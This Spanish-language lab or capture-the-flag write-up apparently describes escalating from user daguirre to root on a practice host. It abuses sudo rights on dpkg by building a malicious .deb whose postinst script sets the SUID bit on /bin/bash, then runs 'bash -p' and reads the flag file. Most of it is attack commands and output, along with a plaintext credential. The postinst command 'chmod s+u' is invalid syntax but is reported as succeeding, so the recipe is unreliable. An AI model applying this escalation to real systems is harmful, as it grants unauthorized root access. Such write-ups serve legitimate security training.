# Parte 2

ya teniamos la credencial  `daguirre:contratreta` (se destaca que `daguirre` es el usuario que se utilizara para la escalada), entonces accedimos al mismo, y como primer paso lo que hicimos es reconocer lo que se tenia.., para eso lo que se hizo fue ejecutar el programa limpeas (Linux Privilege Escalation Awesome Script), primero se lo movio con:

```bash
scp /usr/local/bin/linpeas.sh daguirre@10.0.3.5:/tmp/linpeas.sh
```

es decir lo movimos de la maquina atacante a la maquina de aguirre, luego dejamos que se ejecutara el mimso:

```bash
daguirre@victim-3:$ chmod +x linpeas.sh
daguirre@victim-3:$ ./linpeas.sh 2>&1 | tee linpeas_output.txt
```

y despues de un tiempo teniamos el output de limpeas, esto nos daba info como:

```
[+] System Information
─────────────────────
Linux version: 5.15.0-75-generic (#82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023)
OS: Ubuntu 22.04.2 LTS

[+] Users with shell
────────────────────
root:x:0:0:root:/root:/bin/bash
mre:x:1002:1003:Miguel A. Re:/home/mre:/bin/bash
daguirre:x:1003:1004:Diego Hernan Aguirre:/home/daguirre:/bin/bash
jadrover:x:1005:1006:Jorge G. Adrover:/home/jadrover:/bin/bash

[+] Sudo privileges
────────────────────
User daguirre may run the following commands on victim-3:
    (root) NOPASSWD: /usr/bin/dpkg, /usr/bin/apt-get

[+] SUID binaries
────────────────────
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh

```

despues se consultaron las fuentes de informacion para saber como hacer una escalada

Según la checklist de escalada de privilegios en Linux de HackTricks, uno de los primeros vectores a verificar es:

"Can you execute any command with sudo? Can you use it to READ, WRITE or EXECUTE anything as root?"
— Fuente: HackTricks - SUDO and SUID commands

y la idea vino vienod el output de limpeas, especificamente la parte que decia:
```
[+] Sudo privileges
────────────────────
User daguirre may run the following commands on victim-3:
    (root) NOPASSWD: /usr/bin/dpkg, /usr/bin/apt-get
```


fue util tambien ver lo que decian otras fuentes, para precisar un poco mas el ataque

```
Explotación de dpkg (GTFOBins)
"dpkg -i can spawn an interactive system shell when executed via sudo because the acquired privileges are not dropped."
— Fuente: GTFOBins - dpkg#shell
```

Es decir, siguiendo la técnica documentada, se construye un paquete Debian malicioso con un script postinst que se ejecuta como root.

O siendo mas preciso esto nos dice que un usuario normal (en este caso daguirre) puede instalar paquetes con privilegios de superusuario, esto es extremadamente critico, porque si nosotros armamos un paquete .deb, que ejecute un script despues de la instalacion, y le decimos que mantenga los priviliegiso, podemos acceder a una shell de root

primero hay que destacar que Los scripts `postinst` se ejecutan **automáticamente con privilegios de root** después de instalar un paquete. Esto es lo que explotamos.

Ademas, lo que queremos ver es un permiso especial en Linux que permite ejecutar un archivo con los privilegios de su propietario (generalmente root).

```bash
-rwsr-xr-x   # La 's' en posición del owner indica SUID
```

enotnces lo que hacemos es crear el paquete malicioso, para esto creamos una rchivo de metasdatos asi:
```
Package: pwn
Version: 1.0
Section: custom
Priority: optional
Architecture: all
Maintainer: root
Description: romper todo
```

y lo pusimos en `/tmp/pwn/DEBIAN/control`, luego creamos el archivo critio, el `postinst`, que fue conlocado en `/tmp/pwn/DEBIAN/postinst` y contenia 

```bash
#!/bin/bash
chmod s+u /bin/bash
```

en este caso el `s+u` era que preservar los permisos de user y sumarlo de bit de s de SUID, y ejecutamos `/bin/bash` es decir los binasrios de bash para linux, esto nos permite acceder a una terminal de bash con, la bandera de suid activa!, enotnces faltaba compilar el paquete:

```bash
daguirre@victim-3:~$ dpkg-deb --build /tmp/pwn /tmp/pwn.deb
```

una vez compilado, se instalo:

```bash
daguirre@victim-3:~$ sudo dpkg -i /tmp/pwn.deb
```

y por ultimo, obtuvimos la shell de root ejecutando:

```bash
daguirre@victim-3:~$ bash -p
bash-5.1#
```

Notar que la flag `-p` (privileged mode) le dice a bash que **no** baje los privilegios aunque se ejecute con SUID. Y se puede comprobar que obtuvimos acceso con el SUID, ejecutando estos comandos:

```bash
bash-5.1# whoami
root
```

por ultimo, habia que descargar `/root/flag.txt`, para esto podiamos usar scp o, tambien leer el archivo y copiarlo directamente, que fue lo que se hizo:

```
bash-5.1# cat /root/flag.txt
ok?vi{~xs$:(1@qrd&<_)4ne!`aw-t1f
```


